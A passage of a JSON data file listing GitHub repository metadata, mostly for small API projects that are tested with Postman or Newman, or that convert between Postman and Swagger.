feature.","fork":false,"created_at":"2019-10-17T03:43:24Z","updated_at":"2020-03-12T05:37:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":48290922,"owner_login":"karthick-git","owner_avatar_url":"https://avatars0.githubusercontent.com/u/48290922?v=4","pulled":1,"tags":["test","repo","testing","tool","auto","automat","framework","built","course","image","automation","report","feature","integrate","automatic","integrated","continuous","slack","reporting"]},{"id":99124287,"name":"postman-gmail-extension","full_name":"WPPlugins/postman-gmail-extension","description":"This is a mirror of the svn repo: https://plugins.svn.wordpress.org/postman-gmail-extension/, the master is always the latest release.","fork":false,"created_at":"2017-08-02T14:16:01Z","updated_at":"2017-08-02T14:16:15Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17740254,"owner_login":"WPPlugins","owner_avatar_url":"https://avatars3.githubusercontent.com/u/17740254?v=4","pulled":1,"tags":["test","repo","http","mail","https","extension","plugin","latest","master","release","always","mirror","wordpress"]},{"id":51218574,"name":"noderestapi","full_name":"iamrafiul/noderestapi","description":"Simple RESTful API using NodeJS and MongoDB for basic CRUD operation. You can test this api using POSTMAN chrome plugin.","fork":false,"created_at":"2016-02-06T19:47:08Z","updated_at":"2016-02-06T19:53:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1510167,"owner_login":"iamrafiul","owner_avatar_url":"https://avatars1.githubusercontent.com/u/1510167?v=4","pulled":1,"tags":["test","operation","plugin","chrome"]},{"id":87177871,"name":"Cucumber_MailTestReports","full_name":"Harini-Gnanasekaran/Cucumber_MailTestReports","description":"Sample project to explain the usage of Postman Plugin, that helps to automatically send test report mail on every run of test build","fork":false,"created_at":"2017-04-04T11:18:35Z","updated_at":"2018-06-13T10:59:00Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":25296487,"owner_login":"Harini-Gnanasekaran","owner_avatar_url":"https://avatars2.githubusercontent.com/u/25296487?v=4","pulled":1,"tags":["test","repo","call","auto","automat","mail","help","build","send","very","report","ever","automatic","automatically","helps","plain","explain","every"]},{"id":177793199,"name":"yhcr-proxy-server-api-tests","full_name":"thatinterfaceguy/yhcr-proxy-server-api-tests","description":"Docker compose file, postman environment and collection for running tests against YHCR FHIR proxy servers locally","fork":false,"created_at":"2019-03-26T13:23:38Z","updated_at":"2019-04-30T10:28:26Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":45122994,"owner_login":"thatinterfaceguy","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45122994?v=4","pulled":1,"tags":["test"," postman","collect","collection","file","tests","server","tests ","call","environment","local","running","proxy","locally","servers","compose"]},{"id":167654063,"name":"PostmanToSwagger_GO","full_name":"LiuKaHo/PostmanToSwagger_GO","description":null,"fork":false,"created_at":"2019-01-26T05:37:05Z","updated_at":"2019-02-18T14:59:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15521041,"owner_login":"LiuKaHo","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15521041?v=4","pulled":1,"tags":[]},{"id":91486511,"name":"PostmanToSwagger","full_name":"mikeatphizzle/PostmanToSwagger","description":null,"fork":false,"created_at":"2017-05-16T17:35:25Z","updated_at":"2020-03-30T17:36:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28737593,"owner_login":"mikeatphizzle","owner_avatar_url":"https://avatars0.githubusercontent.com/u/28737593?v=4","pulled":1,"tags":[]},{"id":162207368,"name":"SwaggerToPostman","full_name":"dangerousplay/SwaggerToPostman","description":null,"fork":false,"created_at":"2018-12-18T00:29:53Z","updated_at":"2018-12-19T16:27:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24483153,"owner_login":"dangerousplay","owner_avatar_url":"https://avatars3.githubusercontent.com/u/24483153?v=4","pulled":1,"tags":[]},{"id":112542858,"name":"swagger2postman","full_name":"Bdthomson/swagger2postman","description":null,"fork":false,"created_at":"2017-11-30T00:16:30Z","updated_at":"2018-06-13T17:09:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7236299,"owner_login":"Bdthomson","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7236299?v=4","pulled":1,"tags":[]},{"id":177816386,"name":"Spring-Boot-With-Swagger-","full_name":"RashmiPrava21/Spring-Boot-With-Swagger-","description":"Designed Employee Account and developed it in Spring Boot application with Swagger, JUNIT tests and Postman tests","fork":false,"created_at":"2019-03-26T15:25:30Z","updated_at":"2019-03-26T16:01:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33043026,"owner_login":"RashmiPrava21","owner_avatar_url":"https://avatars1.githubusercontent.com/u/33043026?v=4","pulled":1,"tags":["test","tests","application","tests ","develop","sign","developed"]},{"id":180115694,"name":"swagpostception","full_name":"sshocked/swagpostception","description":"Generating codeception api test from your postman collection or swagger spec","fork":false,"created_at":"2019-04-08T09:30:25Z","updated_at":"2020-02-17T19:18:59Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":26477999,"owner_login":"sshocked","owner_avatar_url":"https://avatars0.githubusercontent.com/u/26477999?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection","code","spec","swagger","rating","codeception"]},{"id":156440463,"name":"medium-Tdd-Js-Swggr-Dckr","full_name":"testProjekten/medium-Tdd-Js-Swggr-Dckr","description":"Implementing this post Project https://medium.com/nycdev/agile-and-test-driven-development-tdd-with-swagger-docker-github-postman-newman-and-jenkins-347bd11d5069","fork":false,"created_at":"2018-11-06T20:04:00Z","updated_at":"2018-11-06T20:09:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44818180,"owner_login":"testProjekten","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44818180?v=4","pulled":1,"tags":["test","http","develop","newman","https","swagger","development","github","docker","drive","jenkins","driven","agile"]},{"id":122041309,"name":"Laravel-Articles","full_name":"MaxDrljic/Laravel-Articles","description":"Simple Laravel app made for testing CRUD functionality with Postman.","fork":false,"created_at":"2018-02-19T09:29:05Z","updated_at":"2018-02-19T10:22:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25199354,"owner_login":"MaxDrljic","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25199354?v=4","pulled":1,"tags":["test","testing","function","functional","functionality"]},{"id":140409124,"name":"laravel-movie-api","full_name":"tonyxhepa/laravel-movie-api","description":"laravel movie+serie api build with postman tested","fork":false,"created_at":"2018-07-10T09:27:49Z","updated_at":"2018-07-10T09:31:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12224570,"owner_login":"tonyxhepa","owner_avatar_url":"https://avatars0.githubusercontent.com/u/12224570?v=4","pulled":1,"tags":["test"," postman","tested","build","laravel","movie"]},{"id":96451711,"name":"laravel-api-pokemon","full_name":"marciowinicius/laravel-api-pokemon","description":"API Para cadastro de usuários e seus pokemons, para testar a API basta utilizar o postman.","fork":false,"created_at":"2017-07-06T16:43:30Z","updated_at":"2017-07-06T16:45:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14933271,"owner_login":"marciowinicius","owner_avatar_url":"https://avatars0.githubusercontent.com/u/14933271?v=4","pulled":1,"tags":["test"," postman","util","star","cadastro","pokemon"]},{"id":94392199,"name":"laravel-api-test","full_name":"brunocouty/laravel-api-test","description":"Similar to \"postman\" (of Google Chrome), this package help you to test your API routes directly in your application.","fork":false,"created_at":"2017-06-15T02:40:06Z","updated_at":"2017-06-15T02:40:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9448901,"owner_login":"brunocouty","owner_avatar_url":"https://avatars2.githubusercontent.com/u/9448901?v=4","pulled":1,"tags":["test","application","help","route","routes","package","directly","\"postman\""]},{"id":168833206,"name":"lectures-api","full_name":"DV2017/lectures-api","description":"A fully tested (in postman) Laravel 5.7 API with simple authentication without passport ","fork":false,"created_at":"2019-02-02T13:13:58Z","updated_at":"2019-02-03T13:42:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26791798,"owner_login":"DV2017","owner_avatar_url":"https://avatars3.githubusercontent.com/u/26791798?v=4","pulled":1,"tags":["test"," postman","auth","tested","full","authentication","ully","fully","passport"]},{"id":161702588,"name":"flight-api","full_name":"omarabdeljelil/flight-api","description":"Flight API (created with laravel 5.7) all the HTTP requests are tested with Postman/fiddler. it includes data validation and require user's Token validation for PUT,POST and DELETE requests","fork":false,"created_at":"2018-12-13T22:32:39Z","updated_at":"2018-12-15T18:42:45Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":24657418,"owner_login":"omarabdeljelil","owner_avatar_url":"https://avatars3.githubusercontent.com/u/24657418?v=4","pulled":1,"tags":["test","create","data","request","requests","user","tested","laravel","light","includes","validation","require","fiddler"]},{"id":223620810,"name":"Fiddler2Postman","full_name":"liyinchigithub/Fiddler2Postman","description":null,"fork":false,"created_at":"2019-11-23T16:38:07Z","updated_at":"2019-11-23T16:38:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19643260,"owner_login":"liyinchigithub","owner_avatar_url":"https://avatars2.githubusercontent.com/u/19643260?v=4","pulled":1,"tags":[]},{"id":51991274,"name":"AspNet_WebApi2_Versioning","full_name":"Apollo013/AspNet_WebApi2_Versioning","description":"Demonstrates 5 techniques for API versioning using route uri, query string parameters, custom request header & accept header (content-type). Requires Fiddler or POSTMAN to test.","fork":false,"created_at":"2016-02-18T08:13:42Z","updated_at":"2016-10-19T13:48:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9936358,"owner_login":"Apollo013","owner_avatar_url":"https://avatars1.githubusercontent.com/u/9936358?v=4","pulled":1,"tags":["test","request","route","version","custom","tech","type","header","parameter","query","content","versioning","technique","techniques"]},{"id":62817902,"name":"AspNet_WebApi2_MultiPipeLine","full_name":"Apollo013/AspNet_WebApi2_MultiPipeLine","description":"A small ASP.NET that demonstrates how to configure a WEB API project to have multiple piplines and specify which controllers are accessible for each pipeline. Requires Fiddler or POSTMAN to test.","fork":false,"created_at":"2016-07-07T15:30:24Z","updated_at":"2016-10-19T14:00:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9936358,"owner_login":"Apollo013","owner_avatar_url":"https://avatars1.githubusercontent.com/u/9936358?v=4","pulled":1,"tags":["test","line","demo","spec","config","access","control","multiple","small","lines","demonstrate","controller","configure","pipeline","demonstrates","piplines"]},{"id":220352730,"name":"InventoryManagementAPI","full_name":"AstroEL/InventoryManagementAPI","description":"Generic Inventory Management API - using Maven/Spring/MySQL/Log4j / tested using Postman","fork":false,"created_at":"2019-11-08T00:13:34Z","updated_at":"2019-11-08T04:29:58Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":40284841,"owner_login":"AstroEL","owner_avatar_url":"https://avatars1.githubusercontent.com/u/40284841?v=4","pulled":1,"tags":["test","tested"]},{"id":244408150,"name":"Curso-SpringBoot","full_name":"viniciusamorim2000/Curso-SpringBoot","description":"Projeto desenvolvido usando JAVA,Tomcat, JPA, Hibernate, Spring Boot, Sql, PostgresSQL, banco de teste H2, ferramenta para teste de software: Postman .Estudos baseado no curso de orientação objetos em JAVA do Nélio Alves","fork":false,"created_at":"2020-03-02T15:39:51Z","updated_at":"2020-03-09T19:42:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":50928317,"owner_login":"viniciusamorim2000","owner_avatar_url":"https://avatars1.githubusercontent.com/u/50928317?v=4","pulled":1,"tags":["test","software","usando","banco","curso","desenvolvido","objetos"]},{"id":248834398,"name":"GameStoreSpring","full_name":"InLove4Coding/GameStoreSpring","description":"Game Store - simple project on popular stack :Spring, h2, lombok, Jpa. Данный проект использует in memory db, так что его можете запустить без дампа бд. Запросы пока через postman, примеры в комментариях кода. По http://localhost:8080/h2/ можете поработать с бд через интерфейс. Для захода jdbcUrl -> jdbc:h2:mem:testdb . Далее о.к (юзер по умолчанию sa, без пароля)","fork":false,"created_at":"2020-03-20T19:18:14Z","updated_at":"2020-03-20T19:38:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43555018,"owner_login":"InLove4Coding","owner_avatar_url":"https://avatars1.githubusercontent.com/u/43555018?v=4","pulled":1,"tags":["test"," postman","http","local","host","stack","popular","memory","in memory","jdbc","lombok"]},{"id":204454516,"name":"inventory_management","full_name":"axel-n/inventory_management","description":null,"fork":false,"created_at":"2019-08-26T10:44:33Z","updated_at":"2019-09-09T12:53:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6695246,"owner_login":"axel-n","owner_avatar_url":"https://avatars3.githubusercontent.com/u/6695246?v=4","pulled":1,"tags":[]},{"id":130136501,"name":"ClassSchedulerUsingSpring","full_name":"amulyachennaboyena/ClassSchedulerUsingSpring","description":"University project:create an application that will change a course schedule  When an application user select the first day of class, the application needs to change the dates in course schedule automatically If a class is canceled due to inclement weather, entire dates should be updated If the class didn’t finish the topics as scheduled, contents of course, quiz and assignment schedule should be updated  You may create a separate UI for testing purposes or utilize a Tool like SoapUI or PostMan.  You will need to use the latest of:          Java 8          Spring Framework          MySQL or Maria DB","fork":false,"created_at":"2018-04-19T00:18:13Z","updated_at":"2018-05-08T22:01:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35663002,"owner_login":"amulyachennaboyena","owner_avatar_url":"https://avatars0.githubusercontent.com/u/35663002?v=4","pulled":1,"tags":["test","create","testing","application","call","user","auto","automat","sign","util","update","course","need","class","automatic","needs","automatically","assignment","should","purposes","updated","latest","content","select","schedule","entire","weather","contents"]},{"id":130367620,"name":"classScheduler","full_name":"AmulyaChen/classScheduler","description":"University project:create an application that will change a course schedule  When an application user select the first day of class, the application needs to change the dates in course schedule automatically If a class is canceled due to inclement weather, entire dates should be updated If the class didn’t finish the topics as scheduled, contents of course, quiz and assignment schedule should be updated  You may create a separate UI for testing purposes or utilize a Tool like SoapUI or PostMan.  You will need to use the latest of:          Java 8          Spring Framework          MySQL or Maria DB","fork":false,"created_at":"2018-04-20T13:43:16Z","updated_at":"2018-04-20T13:43:16Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38562529,"owner_login":"AmulyaChen","owner_avatar_url":"https://avatars3.githubusercontent.com/u/38562529?v=4","pulled":1,"tags":["test","create","testing","application","call","user","auto","automat","sign","util","update","course","need","class","automatic","needs","automatically","assignment","should","purposes","updated","latest","content","select","schedule","entire","weather","contents"]},{"id":140873973,"name":"newman-as-node-module","full_name":"misiekofski/newman-as-node-module","description":"Run API tests from Postman with Newman as npm module","fork":false,"created_at":"2018-07-13T17:15:58Z","updated_at":"2020-02-02T13:55:43Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":19623705,"owner_login":"misiekofski","owner_avatar_url":"https://avatars2.githubusercontent.com/u/19623705?v=4","pulled":1,"tags":["test","tests","tests ","module"]},{"id":106513321,"name":"gradle-postman-example","full_name":"daggerok/gradle-postman-example","description":"This repository contains example how to execute postman collection tests using gradle (newman npm package). Add functionality to collect all html reports into single one","fork":false,"created_at":"2017-10-11T06:17:53Z","updated_at":"2019-01-21T22:32:14Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":2445604,"owner_login":"daggerok","owner_avatar_url":"https://avatars2.githubusercontent.com/u/2445604?v=4","pulled":1,"tags":["test"," postman","collect","collection","repo","postman collection","repos","repository","tests","tests ","example","newman","contain","function","functional","package","html","report","functionality","single","execute","reports","gradle"]},{"id":244163788,"name":"nodejs-crud","full_name":"awaism551/nodejs-crud","description":"Simple CRUD app using NODEjs, Expressjs and mongodb, app was tested using postman and all crud apis was doing fantastic","fork":false,"created_at":"2020-03-01T14:27:54Z","updated_at":"2020-03-01T14:30:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22662124,"owner_login":"awaism551","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22662124?v=4","pulled":1,"tags":["test"," postman","mongo","tested","mongod","mongodb","crud","doing","crud api","fantastic"]},{"id":169748837,"name":"Node-Simple-API-CURD","full_name":"cheran2017/Node-Simple-API-CURD","description":"This repository is contains a simple codes for the CURD operation using API .(u can test it with postman) ","fork":false,"created_at":"2019-02-08T14:42:37Z","updated_at":"2019-02-08T14:51:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25399522,"owner_login":"cheran2017","owner_avatar_url":"https://avatars2.githubusercontent.com/u/25399522?v=4","pulled":1,"tags":["test"," postman","repo","repos","repository","code","contain","operation","codes"]},{"id":99654839,"name":"node_api_tester","full_name":"keyur1363/node_api_tester","description":"Simple API tester","fork":false,"created_at":"2017-08-08T05:47:30Z","updated_at":"2017-08-10T22:30:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19355244,"owner_login":"keyur1363","owner_avatar_url":"https://avatars1.githubusercontent.com/u/19355244?v=4","pulled":1,"tags":["test","tester"]},{"id":139741753,"name":"BasicAPIWithNodeExpress","full_name":"romeobleonor/BasicAPIWithNodeExpress","description":"Basic API with Node, Express and MongoDB - Performed CRUD and Learned API testing tools - (PostMan) - Introuduction to MongoDB and Mongoose and ROBO 3T","fork":false,"created_at":"2018-07-04T15:53:27Z","updated_at":"2018-07-04T16:20:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2036634,"owner_login":"romeobleonor","owner_avatar_url":"https://avatars0.githubusercontent.com/u/2036634?v=4","pulled":1,"tags":["test","testing","form","tool","tools"]},{"id":112301483,"name":"Node_TODO-Api","full_name":"AlwarKrish/Node_TODO-Api","description":"A simple application that integrates todo lists with users demonstrating mongodb integration with Node.js. The application was tested using postman.","fork":false,"created_at":"2017-11-28T07:29:46Z","updated_at":"2017-12-14T05:07:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29711689,"owner_login":"AlwarKrish","owner_avatar_url":"https://avatars0.githubusercontent.com/u/29711689?v=4","pulled":1,"tags":["test"," postman","application","user","mongo","tested","demo","integration","list","users","rating","mongod","mongodb","integrate","todo","demonstrating","lists","integrates"]},{"id":236575420,"name":"wpx17-node-2-lecture","full_name":"ackentdev/wpx17-node-2-lecture","description":"This is a repo built to show how to create a basic RESTful server and run tests on postman for a bootcamp","fork":false,"created_at":"2020-01-27T19:31:56Z","updated_at":"2020-01-27T19:34:17Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":49373960,"owner_login":"ackentdev","owner_avatar_url":"https://avatars1.githubusercontent.com/u/49373960?v=4","pulled":1,"tags":["test"," postman","create","repo","tests","server","tests ","built","boot","bootcamp"]},{"id":210765017,"name":"owlfuse-funx","full_name":"rustiphyde/owlfuse-funx","description":"The server side of OwlFuse built in JavaScript, Node.js, Express, Busboy, and Firebase and tested on Postman","fork":false,"created_at":"2019-09-25T05:47:16Z","updated_at":"2020-03-27T06:23:14Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":30541772,"owner_login":"rustiphyde","owner_avatar_url":"https://avatars0.githubusercontent.com/u/30541772?v=4","pulled":1,"tags":["test","server","tested","built","side"]},{"id":165413321,"name":"especificacoes-openapi-cursos","full_name":"cleisommais/especificacoes-openapi-cursos","description":"Aprenda a implementar, testar e fazer deploy de APIs usando OpenAPI, Apigee, Docker, Node JS + Express, Postman e Heroku","fork":false,"created_at":"2019-01-12T17:04:01Z","updated_at":"2019-01-21T19:00:29Z","stargazers_count":0,"watchers_count":0,"forks":2,"watchers":0,"score":1,"owner_id":875949,"owner_login":"cleisommais","owner_avatar_url":"https://avatars2.githubusercontent.com/u/875949?v=4","pulled":1,"tags":["test","implement","star","usando"]},{"id":58987348,"name":"ServerSideAuthWithNode","full_name":"Andriy-Kulak/ServerSideAuthWithNode","description":"Server side setup with node that can be used for future application. To use, 1) run mongodb with 'mongod' command 2) In another terminal, run npm with 'npm run dev' 3) go to Postman and use localhost:3090/ && localhost:3090/signup && localhost:3090/signin to test the app","fork":false,"created_at":"2016-05-17T03:26:23Z","updated_at":"2019-02-13T10:10:03Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":12179976,"owner_login":"Andriy-Kulak","owner_avatar_url":"https://avatars1.githubusercontent.com/u/12179976?v=4","pulled":1,"tags":["test","application","node","mongo","sign","local","host","command","mongod","mongodb","side","setup","terminal","another","signup","future"]},{"id":84042545,"name":"api_tester","full_name":"suresach/api_tester","description":"Written in Node.js using Electron this app lets you test APIs from your Desktop. Something like Postman (a very basic version though). View it here: ","fork":false,"created_at":"2017-03-06T07:22:44Z","updated_at":"2017-03-06T07:23:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13038586,"owner_login":"suresach","owner_avatar_url":"https://avatars0.githubusercontent.com/u/13038586?v=4","pulled":1,"tags":["test","version","very","lets"]},{"id":93477011,"name":"SimpleServer","full_name":"dapinitial/SimpleServer","description":"Simple Server with Authentication Middleware using Node, Express, Mongoose, MongoDB, Morgan, body-parser, bcrypt, JWT, and Passport. Boilerplate per usual, route-tested with Postman and RoboMongo. ","fork":false,"created_at":"2017-06-06T04:44:09Z","updated_at":"2017-12-03T23:15:57Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":4205314,"owner_login":"dapinitial","owner_avatar_url":"https://avatars0.githubusercontent.com/u/4205314?v=4","pulled":1,"tags":["test","tested","route","plate","parse","parser","bcrypt","usual"]},{"id":187546007,"name":"Task-Manager-API","full_name":"jjian4/Task-Manager-API","description":"Create, read, update, delete users and tasks. Uses web tokens for account authentication. Built using Node.js, Express.js, and MongoDB/Mongoose. Used Postman for testing.","fork":false,"created_at":"2019-05-20T01:07:05Z","updated_at":"2019-05-23T02:59:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39073669,"owner_login":"jjian4","owner_avatar_url":"https://avatars1.githubusercontent.com/u/39073669?v=4","pulled":1,"tags":["test","testing","user","auth","read","authentication","users","update","delete","task","token","account","tasks","tokens"]},{"id":154142699,"name":"dog-match","full_name":"teamcasper/dog-match","description":"Group project for Alchemy's code lab 401. It was designed for potential buyers and sellers to provide dog information such as cost, location, breed, etc. It was built using Node and mongoDB on the backend, and tested with postman and Heroku on the front end.","fork":false,"created_at":"2018-10-22T12:47:18Z","updated_at":"2018-11-05T00:36:48Z","stargazers_count":0,"watchers_count":0,"forks":2,"watchers":0,"score":1,"owner_id":44304864,"owner_login":"teamcasper","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44304864?v=4","pulled":1,"tags":["test"," postman","form","code","mongo","sign","format","tested","built","front","backend","provide","info","infor","information","design","designed","front end","location","such","cost"]},{"id":104284014,"name":"BookAPI-Web-Services","full_name":"akshaymittal143/BookAPI-Web-Services","description":"Node.js is a simple and powerful tool for back-end development. When combined with express, you can create lightweight, fast, scalable APIs quickly and simply. which will walk through how to stand up a lightweight Express server serving truly RESTful services using Node.js, Mongoose, and MongoDB. We will implement all of the RESTful verbs to get, add, and update data from our service. We will also spend some time working through unit and end to end integration tests for our services.","fork":false,"created_at":"2017-09-21T01:00:22Z","updated_at":"2017-10-09T01:01:01Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":8115184,"owner_login":"akshaymittal143","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8115184?v=4","pulled":1,"tags":["test","create","data","tests","service","tool","server","tests ","develop","express","implement"," express","integration","services","update","development","working","light","unit","combine","powerful","quickly","verb","end to end","lightweight","combined"]},{"id":158105938,"name":"FirstExpressWebSite","full_name":"J-Nicholas/FirstExpressWebSite","description":"This is a website I created for a college module in which we utilised Express, Node Js, Javascript, BootStrap, Ajax, for the site and MongoDB for the databsea and Postman to test APIs that we wrote.","fork":false,"created_at":"2018-11-18T16:53:50Z","updated_at":"2018-11-27T02:53:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37844909,"owner_login":"J-Nicholas","owner_avatar_url":"https://avatars3.githubusercontent.com/u/37844909?v=4","pulled":1,"tags":["test","create","data","script","util","site","website","module","tabs","college","databse"]},{"id":135059002,"name":"devconnector","full_name":"momo112/devconnector","description":"Social networking site to allow developers to connect, communicate and organize meetups. Based on the MERN stack (MongoDB, Express.js, React.js, and Node.js). Validated and tested APIs with postman. Used React for the frontend and Redux to manage the states.","fork":false,"created_at":"2018-05-27T15:32:34Z","updated_at":"2018-09-03T21:47:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5515435,"owner_login":"momo112","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5515435?v=4","pulled":1,"tags":["test"," postman","develop","tested","manage","site","front","stat","connect","developer","working","stack","developers","frontend","network","communicate","networking"]},{"id":203203037,"name":"ExpressJS-Mongoose-MongoDb","full_name":"suhpin95/ExpressJS-Mongoose-MongoDb","description":"Code contains RESTful API that connects MongoDB Atlas using ExpressJS, which can be tested through POSTMAN","fork":false,"created_at":"2019-08-19T15:48:16Z","updated_at":"2020-01-28T17:30:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8039417,"owner_login":"suhpin95","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8039417?v=4","pulled":1,"tags":["test","contain","tested","connect","connects"]},{"id":182545951,"name":"Backend---Express","full_name":"dilanSuraj/Backend---Express","description":"This contains Full backend project created using express and tested with Postman","fork":false,"created_at":"2019-04-21T14:46:48Z","updated_at":"2019-07-16T05:53:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40181843,"owner_login":"dilanSuraj","owner_avatar_url":"https://avatars2.githubusercontent.com/u/40181843?v=4","pulled":1,"tags":["test","create","express","contain"," express","tested","backend"]},{"id":213521986,"name":"custom-api-with-express-and-mongodb","full_name":"pui-kuan93/custom-api-with-express-and-mongodb","description":"Creating a custom API using Express & MongoDB (and Postman for testing)","fork":false,"created_at":"2019-10-08T01:32:20Z","updated_at":"2019-10-10T03:38:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":56125713,"owner_login":"pui-kuan93","owner_avatar_url":"https://avatars0.githubusercontent.com/u/56125713?v=4","pulled":1,"tags":["test","testing","custom"]},{"id":219425300,"name":"Fullstack_Vue_Express","full_name":"edivera/Fullstack_Vue_Express","description":"MEVN tutorial. Express apis tested with postman. Makes requests from vue front end to backend using axios.","fork":false,"created_at":"2019-11-04T05:37:50Z","updated_at":"2019-11-24T08:13:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22969075,"owner_login":"edivera","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22969075?v=4","pulled":1,"tags":["test"," postman","request","requests","tested","front","backend","tutorial","front end","axios"]},{"id":102736159,"name":"newman-example","full_name":"nikoheikkila/newman-example","description":"Simple test project to demo TDD workflow in API development with Postman.","fork":false,"created_at":"2017-09-07T12:47:40Z","updated_at":"2017-09-07T18:14:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":457034,"owner_login":"nikoheikkila","owner_avatar_url":"https://avatars1.githubusercontent.com/u/457034?v=4","pulled":1,"tags":["test","develop","demo","development","workflow"]},{"id":193578602,"name":"burger-queen-api","full_name":"rebecaborges/burger-queen-api","description":null,"fork":false,"created_at":"2019-06-24T20:52:07Z","updated_at":"2019-08-21T01:47:09Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":45304605,"owner_login":"rebecaborges","owner_avatar_url":"https://avatars2.githubusercontent.com/u/45304605?v=4","pulled":1,"tags":[]},{"id":225434681,"name":"capstone-api","full_name":"yingsongsana/capstone-api","description":"Back-end for capstone project, \"Asking For A Friend\", built with Express, MongoDB, & Mongoose. API developed and tested with Postman.","fork":false,"created_at":"2019-12-02T17:46:44Z","updated_at":"2019-12-19T00:25:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54149327,"owner_login":"yingsongsana","owner_avatar_url":"https://avatars1.githubusercontent.com/u/54149327?v=4","pulled":1,"tags":["test","develop","tested","built","developed","capstone"]},{"id":201847461,"name":"knex_testing","full_name":"imjonathanking/knex_testing","description":"I am testing out building an express API using Knex as a SQL query builder/ ORM.  Routes will be tested in Postman.","fork":false,"created_at":"2019-08-12T02:59:22Z","updated_at":"2019-08-12T04:55:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44119837,"owner_login":"imjonathanking","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44119837?v=4","pulled":1,"tags":["test","testing","express"," express","tested","build","building","query","builder"]},{"id":219469277,"name":"pm-converter","full_name":"qdriven/pm-converter","description":"pm-converter convert postman to different api testing 